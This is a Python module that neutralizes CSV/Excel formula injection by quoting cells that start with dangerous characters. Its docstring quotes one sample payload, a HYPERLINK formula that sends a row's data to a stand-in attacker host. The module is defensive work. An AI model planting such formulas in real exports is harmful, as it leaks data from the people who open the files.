"""CSV / Excel formula-injection scrubber (SEC-C11).

Spreadsheet applications (Excel, Google Sheets, LibreOffice) interpret any
cell whose first character is ``=``, ``+``, ``-``, ``@``, ``\\t``, or ``\\r``
as a formula. An attacker who can plant the string
``=HYPERLINK("http://attacker.example/?d="&A1,"click")`` into any user-
controlled field will exfiltrate the surrounding row to ``attacker.example``
the moment a SOC 2 auditor opens the report. Older Excel + DDE is a path to
shell execution.

The OWASP-recommended mitigation is to prefix dangerous leading characters
with a single quote (Excel convention — the quote is hidden but the cell
is rendered as text instead of evaluated as a formula).

Apply at every export boundary (Excel writer, CSV writer, binder, etc.)
and additionally at the import boundary so a poisoned cell is neutralized
before it lands in the DB.
"""

from __future__ import annotations

from typing import Any

_DANGEROUS_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def neutralize_csv_value(value: Any) -> Any:
    """Return ``value`` with formula-injection prefixes neutralized.

    Non-strings pass through unchanged. Strings whose first character is
    one of ``=``, ``+``, ``-``, ``@``, ``\\t``, ``\\r`` are prefixed with
    a single quote so the spreadsheet renders them as literal text.
    """
    if not isinstance(value, str):
        return value
    if not value:
        return value
    if value[0] in _DANGEROUS_PREFIXES:
        return "'" + value
    return value


def neutralize_row(row: dict[str, Any]) -> dict[str, Any]:
    """Return a new dict with every string value scrubbed."""
    return {k: neutralize_csv_value(v) for k, v in row.items()}


def neutralize_rows(rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Map ``neutralize_row`` over an iterable of dicts."""
    return [neutralize_row(r) for r in rows]


def neutralize_list(values: list[Any]) -> list[Any]:
    """Map ``neutralize_csv_value`` over a list (for positional CSV writers)."""
    return [neutralize_csv_value(v) for v in values]
